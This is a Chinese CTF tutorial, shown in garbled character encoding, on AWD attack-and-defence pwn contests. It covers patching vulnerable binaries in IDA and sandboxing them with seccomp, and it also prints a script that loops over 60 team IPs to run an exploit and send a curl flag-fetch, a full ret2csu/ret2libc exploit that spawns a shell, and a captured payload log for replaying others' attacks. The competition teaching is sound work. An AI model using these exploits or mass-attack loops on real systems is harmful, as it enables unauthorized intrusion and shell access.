
AWD PWN æ–¹æ³•æ€»ç»“

- - -

# AWD PWN æ–¹æ³•æ€»ç»“

è®¸å¤š CTF çš„çº¿ä¸‹èµ›éƒ½æ˜¯ AWD æ¨¡å¼ï¼Œæ‰€ä»¥è¿™é‡Œæ¥å­¦ä¹ ä¸€ä¸‹åœ¨ AWD æ—¶ PWN æ‰‹å„ç§åº”å¯¹æ–¹å¼

## AWD ç®€ä»‹

AWD(Attack With Defenseï¼Œæ”»é˜²å…¼å¤‡) æ¨¡å¼éœ€è¦åœ¨ä¸€åœºæ¯”èµ›é‡Œè¦æ‰®æ¼”æ”»å‡»æ–¹å’Œé˜²å®ˆæ–¹ï¼Œåˆ©ç”¨æ¼æ´æ”»å‡»å…¶ä»–é˜Ÿä¼è¿›è¡Œå¾—åˆ†ï¼Œä¿®å¤æ¼æ´å¯ä»¥é¿å…è¢«å…¶ä»–é˜Ÿä¼æ”»å‡»è€Œå¤±åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ”»å‡»åˆ«äººçš„é¶æœºå¯ä»¥è·å– Flag åˆ†æ•°æ—¶ï¼Œåˆ«äººä¼šè¢«æ‰£åˆ†ï¼ŒåŒæ—¶ä¹Ÿè¦ä¿æŠ¤è‡ªå·±çš„ä¸»æœºä¸è¢«åˆ«äººæ”»é™·è€Œæ‰£åˆ†ã€‚

## æ¼æ´åŠ å›ºæŠ€å·§

åœ¨ AWD ä¸­æ¯ä¸ªé€‰æ‰‹ä¼šåˆ†é…åˆ°ä¸€ä¸ªè¿è¡Œäº†æ¼æ´ç¨‹åºçš„é¶æœºï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è‡ªå·±é¶æœºä¸­çš„ PWN é™„ä»¶ï¼ˆä¹Ÿå°±æ˜¯æ¼æ´ç¨‹åºï¼‰è¿›è¡Œåˆ†æï¼Œå‘ç°æ¼æ´æ¥ç¼–å†™ exp æ”»å‡»å…¶ä»–é˜Ÿä¼çš„é¶æœºï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦ç”¨ä¸€äº›æ‰‹æ®µåŠ å›ºæ¼æ´é˜²æ­¢è¢«å…¶ä»–é€‰æ‰‹æ”»å‡»å¾—åˆ†ï¼Œä»¥ä¸‹ä»‹ç»å‡ ç§åŠ å›ºæ–¹æ³•

### patch-PWN

patch å°±æ˜¯é€šè¿‡ä¿®æ”¹æ¼æ´ç¨‹åºçš„æ¼æ´æ±‡ç¼–ä»£ç ä»è€Œé˜²æ­¢å…¶ä»–é€‰æ‰‹è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œä¸åŒçš„ awd å¹³å°æ£€æŸ¥æœºåˆ¶å„ä¸ç›¸åŒï¼ŒåŸåˆ™ä¸Šæ˜¯åªèƒ½é’ˆå¯¹æ¼æ´ç‚¹è¿›è¡Œ patch åŠ å›º

#### å·¥å…·ä»‹ç»ï¼šida æ’ä»¶ keypatch

ä¸€èˆ¬ ida ä¸­éƒ½ä¼šè‡ªå¸¦ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç»™å„ä½æä¾›é…å¥—äº†çš„çš„ ida7.7  
é“¾æ¥ï¼š[https://pan.baidu.com/s/1Nc-KnNRHAJC3dgAvI5QPvA?pwd=omxl](https://pan.baidu.com/s/1Nc-KnNRHAJC3dgAvI5QPvA?pwd=omxl)  
æå–ç ï¼šomxl

ä½¿ç”¨ï¼š

åœ¨ ida çš„æ±‡ç¼–ä»£ç åŒºé€‰ä¸­æƒ³è¦ä¿®æ”¹çš„æ±‡ç¼–ç ï¼Œå³å‡»åæ‰¾åˆ° keypatch

[![](assets/1709106080-b98fc3234234197519a3805307b4a435.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231629-044d2cb2-d4ba-1.png)

å†ç‚¹å‡» patcher è¿›è¡Œä¿®æ”¹

[![](assets/1709106080-130c0b7327e47dcc0d5f2cc5ca16124c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231622-ffee52e0-d4b9-1.png)

ä¿®æ”¹å¥½åç‚¹å‡» patch å³å¯

ä¿®æ”¹åæ•ˆæœï¼š

[![](assets/1709106080-ef0a9ef48bf3cdf5126b23be2d934262.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231615-fbf1d694-d4b9-1.png)

å¦‚æœæƒ³å–æ¶ˆä¿®æ”¹ï¼Œé‚£ä¹ˆå°±å†æ¬¡å³å‡»æ‰¾åˆ° `keypatch` ç„¶åç‚¹å‡» `undo last patching`

[![](assets/1709106080-29bc56530b4a606800d0db91911688fa.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231610-f8abd46c-d4b9-1.png)

è‹¥è¦ä¿å­˜ä¿®æ”¹ï¼Œåˆ™éœ€è¦ç‚¹å‡» Edit -- patch program -- apply patches to input file

[![](assets/1709106080-6740ec631fd9a1c692e2e3934cb005cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231602-f3ddb02c-d4b9-1.png)

#### 1.patch æ•´æ•°æº¢å‡º

è·³è½¬æŒ‡ä»¤

æ— ç¬¦å·è·³è½¬

| æ±‡ç¼–æŒ‡ä»¤ | æè¿°  |
| --- | --- |
| JA  | æ— ç¬¦å·å¤§äºåˆ™è·³è½¬ |
| JNA | æ— ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬ |
| JAE | æ— ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JNBï¼‰ |
| JNAE | æ— ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JBï¼‰ |
| JB  | æ— ç¬¦å·å°äºåˆ™è·³è½¬ |
| JNB | æ— ç¬¦å·ä¸å°äºåˆ™è·³è½¬ |
| JBE | æ— ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JNAï¼‰ |
| JBNE | æ— ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JAï¼‰ |

æœ‰ç¬¦å·è·³è½¬

| æ±‡ç¼–æŒ‡ä»¤ | æè¿°  |
| --- | --- |
| JG  | æœ‰ç¬¦å·å¤§äºåˆ™è·³è½¬ |
| JNG | æœ‰ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬ |
| JGE | æœ‰ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JNLï¼‰ |
| JNGE | æœ‰ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JLï¼‰ |
| JL  | æœ‰ç¬¦å·å°äºåˆ™è·³è½¬ |
| JNL | æœ‰ç¬¦å·ä¸å°äºåˆ™è·³è½¬ |
| JLE | æœ‰ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JNGï¼‰ |
| JNLE | æœ‰ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ï¼ˆåŒ JGï¼‰ |

æ•´æ•°æº¢å‡ºæ¼æ´æ˜¯ç”±äºç¨‹åºå¯¹äºæœ‰æ— ç¬¦å·æ•°çš„åˆ¤æ–­å‡ºç°äº†é—®é¢˜ï¼Œæ‰€ä»¥ patch æ•´æ•°æº¢å‡ºä¾¿æ˜¯é’ˆå¯¹äºæ±‡ç¼–ä¸­çš„è·³è½¬æŒ‡ä»¤è¿›è¡Œ patch

ä¾‹ï¼š

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-14h] BYREF
  void (*v5)(void); // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v5 = (void (*)(void))(int)mmap((void *)0x20240000, 0x1000uLL, 7, 33, -1, 0LL);
  if ( v5 == (void (*)(void))-1LL )
  {
    perror("mmap");
    exit(1);
  }
  printf("input the length of your shellcode:");
  __isoc99_scanf("%2d", &v4);
  if ( (int)v4 <= 10 )
  {
    printf("input your shellcode:");
    myread(v5, v4);
  }
  else
  {
    puts("too long");
  }
  v5();
  return 0;
}
```

```plain
unsigned __int64 __fastcall myread(void *a1, unsigned int a2)
{
  char v3; // [rsp+1Fh] [rbp-11h]
  unsigned int i; // [rsp+20h] [rbp-10h]
  unsigned int v5; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = read(0, a1, a2);
  for ( i = 0; i < v5; ++i )
  {
    v3 = *((_BYTE *)a1 + i);
    if ( (v3 <= 96 || v3 > 122) && (v3 <= 64 || v3 > 90) && (v3 <= 47 || v3 > 57) )
    {
      puts("Invalid character\n");
      exit(1);
    }
  }
  return v6 - __readfsqword(0x28u);
}
```

å¯ä»¥å‘ç°ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œåœ¨åˆ¤æ–­æ—¶ç”¨çš„æ˜¯ `int` è€Œåœ¨ä¼ å‚æ—¶ç”¨çš„æ˜¯ `unsigned int`

å†æŸ¥çœ‹ä¸€ä¸‹å¯¹åº”çš„æ±‡ç¼–ä»£ç 

```plain
.text:00000000000013F7 48 8D 45 EC                   lea     rax, [rbp+var_14]
.text:00000000000013FB 48 89 C6                      mov     rsi, rax
.text:00000000000013FE 48 8D 05 3F 0C 00 00          lea     rax, a2d                        ; "%2d"
.text:0000000000001405 48 89 C7                      mov     rdi, rax
.text:0000000000001408 B8 00 00 00 00                mov     eax, 0
.text:000000000000140D E8 2E FD FF FF                call    ___isoc99_scanf
.text:000000000000140D
.text:0000000000001412 8B 45 EC                      mov     eax, [rbp+var_14]
.text:0000000000001415 83 F8 0A                      cmp     eax, 0Ah
.text:0000000000001418 7E 11                         jle     short loc_142B
```

åœ¨è¿™é‡Œä½¿ç”¨äº† JLE æŒ‡ä»¤è¿›è¡Œè·³è½¬ï¼ˆæœ‰ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ï¼‰

é‚£ä¹ˆæˆ‘ä»¬çš„ä¿®æ”¹æ€è·¯å°±æ˜¯å°† JLE æŒ‡ä»¤æ”¹æˆå¯¹åº”æ— ç¬¦å·æ•°è·³è½¬æŒ‡ä»¤ï¼Œå³ JBE å³å¯

[![](assets/1709106080-7cf60699d7f5d72633a73409ca73904b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231519-dab5d174-d4b9-1.png)

#### 2.patch æ ˆæº¢å‡º

x64

ç›¸å¯¹äº x86ï¼Œx64 çš„æ ˆæº¢å‡º patch æ›´åŠ ç®€ä¾¿ï¼Œè¿™æ˜¯å› ä¸º x64 çš„ä¼ å‚æ˜¯é€šè¿‡å¯„å­˜å™¨çš„ï¼Œæ­¤æ—¶åªéœ€è¦é€šè¿‡ patch å¯¹åº”è¾“å…¥é•¿åº¦çš„å¯„å­˜å™¨å³å¯

ä¾‹ï¼š

```plain
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  system("echo welcome to the pwn world!!!!!\n");
  puts("this is the text for you");
  puts("good luck");
  read(0, buf, 0x48uLL);
  puts("Why didn't the questioner put a shell or others??");
  puts("!!!I curse the questioner's wallet  having only $0");
  return 0;
}
```

æ ˆæº¢å‡ºæ¼æ´å¯¹åº”æ±‡ç¼–ï¼š

```plain
.text:000000000040122E 48 8D 45 E0                   lea     rax, [rbp+buf]
.text:0000000000401232 BA 48 00 00 00                mov     edx, 48h ; 'H'                  ; nbytes
.text:0000000000401237 48 89 C6                      mov     rsi, rax                        ; buf
.text:000000000040123A BF 00 00 00 00                mov     edi, 0                          ; fd
.text:000000000040123F B8 00 00 00 00                mov     eax, 0
.text:0000000000401244 E8 57 FE FF FF                call    _read
.text:0000000000401244
```

æˆ‘ä»¬å¯ä»¥çœ‹åˆ° 0x48 æ˜¯ç”± rdx ä¼ é€’ï¼Œé‚£ä¹ˆåªè¦ patch æ­¤å¤„ä¸ºä¸€ä¸ªæ— æ³•æº¢å‡ºçš„æ•°å­—å³å¯

[![](assets/1709106080-3ac72237c058124c4fb5c7969e79a1e2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231510-d5063f52-d4b9-1.png)

x86

ä¾‹ï¼š

```plain
int pwnme()
{
  char s[9]; // [esp+Fh] [ebp-9h] BYREF

  fgets(s, 50, stdin);
  return 0;
}
```

```plain
.text:080484EB 55                            push    ebp
.text:080484EC 89 E5                         mov     ebp, esp
.text:080484EE 83 EC 18                      sub     esp, 18h
.text:080484F1 A1 40 A0 04 08                mov     eax, ds:stdin@@GLIBC_2_0
.text:080484F6 83 EC 04                      sub     esp, 4
.text:080484F9 50                            push    eax                             ; stream
.text:080484FA 6A 32                         push    32h ; '2'                       ; n
.text:080484FC 8D 45 F7                      lea     eax, [ebp+s]
.text:080484FF 50                            push    eax                             ; s
.text:08048500 E8 8B FE FF FF                call    _fgets
.text:08048500
```

æ­¤æ—¶å¯ä»¥ç›´æ¥æ›´æ”¹ä¸º 9

[![](assets/1709106080-c6bc54eaf9e63aa74ae84fd960e9b8ff.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231500-cf622bc4-d4b9-1.png)

ä½†æ˜¯å‡è®¾æˆ‘ä»¬éœ€è¦å°†å…¶æ”¹ä¸º 0x100 ä»¥ä¸Š

[![](assets/1709106080-6d6135d1a4abfd1e77bd8dc66aa9eb29.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231453-cb2970ee-d4b9-1.png)

ä¼šæ˜æ˜¾å‘ç°å¤šå‡ºäº†å‡ ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å½“æœ‰çš„é¢˜ç›®æœ‰å‡ºç°è¦å°† 0x100 ä»¥ä¸Šçš„æ•°æ”¹æˆ 0x100 ä»¥ä¸‹ï¼Œå°±ä¼šå¯¼è‡´é•¿åº¦ä¸å¯¹é½ï¼Œå¯¼è‡´å¼•èµ·æ ˆç©ºé—´å˜åŒ–ï¼Œå°±éœ€è¦ç”¨`nop`è¿›è¡Œå¯¹é½

#### 3.patch æ ¼å¼åŒ–å­—ç¬¦ä¸²

ä¾‹ï¼š

```plain
void hack()
{
  void *buf; // [rsp+8h] [rbp-8h]

  buf = malloc(0x400uLL);
  puts("hack me!");
  read(0, buf, 0x400uLL);
  printf((const char *)buf);
  free(buf);
}
```

```plain
.text:000000000000128F 48 8B 45 F8                   mov     rax, [rbp+buf]
.text:0000000000001293 48 89 C7                      mov     rdi, rax                        ; format
.text:0000000000001296 B8 00 00 00 00                mov     eax, 0
.text:000000000000129B E8 20 FE FF FF                call    _printf
.text:000000000000129B
```

æœ‰å‡ ç§æ›´æ”¹æ–¹å¼ï¼š

å¯ä»¥å°† call printf æ”¹æˆ call puts

[![](assets/1709106080-32737f89ae581bd91f35885b3e62ebfd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231448-c7dce5b0-d4b9-1.png)

è¿™æ ·æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¾¿æ— æ³•è¢«åˆ©ç”¨

ä½†æ˜¯ç”±äº puts ä¼šåœ¨å­—ç¬¦ä¸²çš„åŸºç¡€ä¸ŠåŠ ä¸Šä¸€ä¸ª `\n` å­—ç¬¦ï¼Œå¯èƒ½å¯¼è‡´ check ä¸è¿‡è¢«åˆ¤å®•æœºæ‰£åˆ†ï¼Œæ‰€ä»¥åœ¨ç¨‹åºå‚æ•°å…è®¸çš„æƒ…å†µä¸‹æœ€å¥½é‡‡ç”¨ä»¥ä¸‹ä¿®æ”¹ï¼š

ä¿®æ”¹ printf çš„ä¼ å‚æŒ‡ä»¤ï¼Œå°†`printf(format)`ä¿®æ”¹ä¸º`printf("%s",format)`

ä¸è¿‡è¿™é“ä¾‹é¢˜æ²¡æœ‰å¯¹åº”çš„%sç­‰å‚æ•°æ‰€ä»¥ä¸é€‚ç”¨æ­¤æ”¹æ³•

ä»¥ä¸Šçš„ patch åœ¨ä¸€èˆ¬çš„ AWDpwn é¶æœºæƒ…å†µä¸‹åŸºæœ¬å¤Ÿç”¨äº†ï¼Œè¿˜æœ‰ä¸€äº› patch æŠ€å·§ä¾‹å¦‚ UAFã€if èŒƒå›´ã€å±é™©å‡½æ•°å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š

[AWDPwn æ¼æ´åŠ å›ºæ€»ç»“](https://www.freebuf.com/articles/web/283020.html)

### é€šé˜²å°å·¥å…·

å¦‚æœå«Œ patch æ¼æ´å¤ªéº»çƒ¦ï¼Œé‚£å¯ä»¥å°è¯•ä¸€ä¸‹è¿™ä¸ªå·¥å…·ï¼Œä¸è¿‡ä¸ç¡®ä¿ä¸»åŠæ–¹æ˜¯å¦ä¼š check å‡ºæ¥ï¼ˆæ»‘ç¨½

æ¥æºäºè¿™ä½å¸ˆå‚…çš„å·¥å…·

[åŸºäº pwntools å’Œ seccomp-tools çš„ awd pwn é€šé˜²å°å·¥å…·-CSDN åšå®¢](https://blog.csdn.net/qq_45595732/article/details/125472253)

å…·ä½“åŸç†å°±æ˜¯é€šè¿‡è¿™ä¸ªå°å·¥å…·ç›´æ¥ç»™ç¨‹åºä¸Šä¸€ä¸ªæ²™ç®±ï¼Œé‡Œé¢ç¦ç”¨äº† execve ç­‰ç³»ç»Ÿè°ƒç”¨ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•è·å¾—åé—¨ shellï¼Œè¿™å¯¹äºä¸€äº›æ—¶é—´ä¸é•¿çš„ awd é¢˜ç›®åŸºæœ¬ä¸Šæ˜¯ä¸€åŠ³æ°¸é€¸çš„æ–¹å¼äº†ï¼Œæ¯•ç«Ÿä¸æ˜¯ä»€ä¹ˆæ¼æ´éƒ½èƒ½æ–¹ä¾¿çš„å†™å‡º orw çš„è°ƒç”¨é“¾çš„ã€‚

github åœ°å€

[https://github.com/TTY-flag/evilPatcher](https://github.com/TTY-flag/evilPatcher)

ç¯å¢ƒéœ€æ±‚ï¼šè¿è¡Œéœ€è¦ä¾èµ– seccomps-tools å’Œ pwntools

[https://github.com/Gallopsled/pwntools](https://github.com/Gallopsled/pwntools)

[https://github.com/david942j/seccomp-tools](https://github.com/david942j/seccomp-tools)

## æ”»å‡»æŠ€å·§

### è‡ªåŠ¨åŒ–è„šæœ¬

awd èµ›åœºä¸Šä¸€èˆ¬éƒ½æœ‰å¾ˆå¤šé˜Ÿä¼çš„é¶æœºï¼Œå¤šçš„æœ‰å¤§æ¦‚ 50~60 ä¸ªï¼Œè€Œä¸€è½®ä¹Ÿå°± 5~10 åˆ†é’Ÿï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬å¦‚æœè·ŸåŸæ¥åš pwn é¢˜ä¸€æ ·ä¸€ä¸ªä¸ªæ‰“ç„¶åæäº¤æ—¶é—´æ ¹æœ¬ä¸å¤Ÿï¼Œç”šè‡³éƒ½æ²¡æœ‰æ—¶é—´æ¥ä¿®æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€äº›è‡ªåŠ¨è„šæœ¬æ¥è¾…åŠ©æˆ‘ä»¬è‡ªåŠ¨æ”»å‡»æ‰€æœ‰é¶æœºæ‹¿åˆ° flagï¼ˆç¬”è€…ç¬¬ä¸€æ¬¡ awd çš„æƒ¨ç—›æ•™è®­ï¼‰

ä¾‹ï¼š

```plain
from pwn import *

#context(arch='amd64', os='linux',log_level='debug')#
flag1=[]
file_name = './pwn'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

elf = ELF(file_name)

def dbg():
    gdb.attach(r)
    pause() 
def dbgg():
    raw_input()

for x in range(60):
    try:
        ip = "10.50.{}.4".format(x+2)
        prot = '1234'
            # print ip
        r = remote(ip,int(prot))
        #æ”»å‡»è„šæœ¬
        exp()
        payload = "curl http://10.0.1.2?token=CRUTRZIW"#æ ¹æ®ä¸»åŠæ–¹çš„è¦æ±‚æ¥è·å– flag
        r.sendline(payload)
        sleep(1)#åœ¨ä¸€äº›é¶æœºå¤šçš„ç¯å¢ƒä¸‹æœ€å¥½åŠ å‡ ä¸ª sleepï¼Œé˜²æ­¢å¡ä½
        sleep(1)
        flag = r.recv(0x20)
        print(str(flag))
        flag1.append(flag)
        index+=1
    except:
            print(ip)
            r.close()
print(flag1)
print("æœ¬è½®å…±æ‹¿åˆ°"+str(index)+"ä¸ªé˜Ÿä¼çš„ flag")
r.interactive()
```

### æŠ„æµé‡åæ‰“

å¦‚æœåœ¨æ¯”èµ›é‡Œå‡ºç°å¯¹ pwn é¶æœºç»™å‡ºçš„é¢˜ç›®æ²¡æœ‰æ€è·¯å¡ä½äº†çš„æƒ…å†µä¸å¦¨ç”¨ç”¨è¿™ä¸ªæ–¹æ³•

å·¥å…·æ¥è‡ªè¿™é‡Œ

[https://github.com/i0gan/pwn\_waf/tree/main](https://github.com/i0gan/pwn_waf/tree/main)

å½“ç„¶è¿™ä¸ªå·¥å…·ä¸æ­¢æ£€æµ‹æµé‡è¿™ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥æŸ¥çœ‹æ–‡æ¡£äº†è§£å„ä¸ªåŠŸèƒ½

[pwn\_waf/README\_ZH.md at main Â· i0gan/pwn\_waf Â· GitHub](https://github.com/i0gan/pwn_waf/blob/main/README_ZH.md)

```plain
è¯¥ waf æœ‰å››ä¸ªæ¨¡å¼
CATCH æ¨¡å¼åªæ˜¯ç®€å•çš„æ•è·è¢«æ”»å‡»çš„äº¤äº’æµé‡ï¼Œå¯ä»¥åœ¨æ—¥å¿—è·¯å¾„ä¸‹æŸ¥çœ‹ã€‚
I0GAN æ¨¡å¼æ˜¯ä¸€ç§é˜²å¾¡æ¨¡å¼ï¼Œå¯ä»¥é˜²æ­¢æ”»å‡»è€…æ‹¿åˆ° shellï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹æ”»å‡»è€…çš„äº¤äº’æµé‡ã€‚
FORWARD æ¨¡å¼åªæ˜¯ç®€å•çš„è½¬å‘æ”»å‡»è€…çš„æµé‡å»æ‰“åˆ«äººï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸­é—´è¿‡ç¨‹æŠ“åˆ°æ”»å‡»è€…çš„æµé‡ã€‚å½“ç„¶ï¼Œå¦‚æœæ”»å‡»è€…æˆåŠŸè·å–åˆ° flagï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ—¥å¿—æ–‡ä»¶ä¸­è·å–åˆ° flagã€‚
FORWARD_MUTIL æ˜¯åŸºäº FORWARD æ¨¡å¼çš„ï¼Œå®ƒä¸»è¦ä» hosts.txt æ–‡ä»¶ä¸­å¾ªç¯è·å–å—å®³è€…çš„ä¸»æœºä¿¡æ¯ï¼Œç„¶åå°†æ”»å‡»è€…çš„æµé‡è½¬å‘ç»™å—å®³è€…ã€‚
```

æˆ‘ä»¬è¿™é‡Œä»‹ç»çš„æ˜¯ catch æ¨¡å¼

ä¸‹è½½å¥½åå† makefile æ–‡ä»¶é‡Œä¿®æ”¹ä½ æƒ³è¦åˆ›å»ºå’Œç›‘å¬çš„æ–‡ä»¶å¤¹è·¯å¾„ï¼Œä»¥åŠç¨‹åºä½æ•°ã€‚ï¼ˆç¡®ä¿è·¯å¾„ä¸‹æ²¡æœ‰ä½ è¦åˆ›å»ºçš„æ–‡ä»¶å¤¹åï¼‰

[![](assets/1709106080-3be81d300dc29ca64c3699df96681841.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231437-c156a366-d4b9-1.png)

æ³¨ï¼šç¬”è€…è¿™é‡Œç”±äºæ˜¯æœ¬åœ°ç›‘å¬æ‰€ä»¥ ip åœ°å€å’Œç«¯å£æ²¡æœ‰åšä¿®æ”¹ï¼Œå®é™…æ˜¯éœ€è¦ä¿®æ”¹ ip å’Œç«¯å£çš„

è¿è¡Œå‘½ä»¤

```plain
make catch
```

æ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯¹åº”ç›®å½•çš„æ–‡ä»¶å¤¹å’Œä¸€ä¸ª catch æ–‡ä»¶

[![](assets/1709106080-f4be398193e937f9e68a373195259716.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231431-bd9c0cfc-d4b9-1.png)

æŠŠå¯¹åº”æ–‡ä»¶å¤¹èµ‹äºˆ rwx æƒé™

```plain
chmod 777 pwn1
```

ç„¶åæŠŠå¯¹åº” pwn é¶æœºæ–‡ä»¶å¤åˆ¶åˆ°åˆ›å»ºçš„ pwn1 æ–‡ä»¶å¤¹

å†ç”¨ç”Ÿæˆçš„ catchï¼ˆæ ¹æ®ä¸åŒæ¨¡å¼ï¼‰æ–‡ä»¶æ›¿æ¢åŸæ–‡ä»¶å¤¹ä¸­çš„åŸå§‹ pwn æ–‡ä»¶

å†å°† pwn1 æ–‡ä»¶å¤¹é‡Œçš„é¶æœºæ–‡ä»¶æ”¹åä¸º./pwn å³å¯

ä¾‹ï¼š

[![](assets/1709106080-bd05be96481880f439494bedf104851c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231418-b61411be-d4b9-1.png)

[![](assets/1709106080-c5655ed760e653203cfe20a348ec3d3e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231422-b891a74e-d4b9-1.png)

æ­¤æ—¶æˆ‘ä»¬å°è¯•è¿è¡Œæ”»å‡»è„šæœ¬

expï¼š

```plain
from pwn import *
from LibcSearcher import *

context.log_level = "debug"
#io = remote('pwn.node.game.sycsec.com', 30385)
io = process('./chal')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')
csu_end_addr=0x40132A
csu_front_addr=0x401310
def csu(rbx, rbp, r12, r15, r14, r13, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call()
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    # csu(0, 1, fun_got, rdx, rsi, rdi, last)
    payload = b""
    payload += p64(csu_end_addr) 
    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38  
    payload += p64(last)    
    return payload 
pop_rdi_ret = 0x401333 
write_got = elf.got['write']
write_plt = 0x401080#elf.plt['write']
ret_addr = 0x40101a
rsi = 0x401331
r131415 = 0x40132e

payload1 = b'a'*0x10+b'\x00'*8 + csu(0,1,1,elf.got['write'],0x30,write_got,0x4011FD)# + p64(rsi) + p64(write_got) + p64(0) + p64(write_plt) + p64(0x4011FD)

io.sendlineafter('backdoor!',payload1)

#write_addr = u64(io.recv(6).ljust(8,b"\x00"))
write_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(write_addr))


libc_base = write_addr - libc.sym["write"]
system = libc_base + libc.symbols['system']
binsh = libc_base+next(libc.search(b"/bin/sh\x00"))
#libc = LibcSearcher('write',write_addr)
#libc_base = write_addr - libc.dump('write')
#system = libc_base + libc.dump('system')
#binsh = libc_base + libc.dump('str_bin_sh')
#binsh = libc_base + libc.dump('str_bin_sh')
print(hex(libc_base))
print(hex(system))
print(hex(binsh))
payload2 = b"\x00".ljust(0x18,b'a') +p64(ret_addr)+ p64(pop_rdi_ret) +p64(binsh) + p64(system) #
#gdb.attach(io)
#pause()
io.sendlineafter('backdoor!',payload2)

io.interactive()
```

æ­¤æ—¶ pwn1 æ–‡ä»¶å¤¹ä¸‹å°±ä¼šå‡ºç°ä¸€æ¡æ—¥å¿—ä¿¡æ¯

[![](assets/1709106080-14b9b1afaf886a22c0782617c24c0708.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240226231407-afd826be-d4b9-1.png)

æ‰“å¼€å°±èƒ½æ‰¾å¯¹åº”çš„ payloadï¼Œç›´æ¥æŠ„è¿›è¡Œåæ‰“

```plain
// Date: 2024-02-26 22:59:57
// Mode: CATCH
// CTF AWD PWN WAF
// Deved By I0gan

<-------------------- write ----------------->
try this
This challenge no backdoor!
w_0 = "\x74\x72\x79\x20\x74\x68\x69\x73\x0a\x54\x68\x69\x73\x20\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x6e\x6f\x20\x62\x61\x63\x6b\x64\x6f\x6f\x72\x21"

<-------------------- read ------------------>
aaaaaaaaaaaaaaaa\00\00\00\00\00\00\00\00*@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@@\00\00\00\00\000\00\00\00\00\00\00\00@@\00\00\00\00\00@\00\00\00\00\00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\FD@\00\00\00\00\00

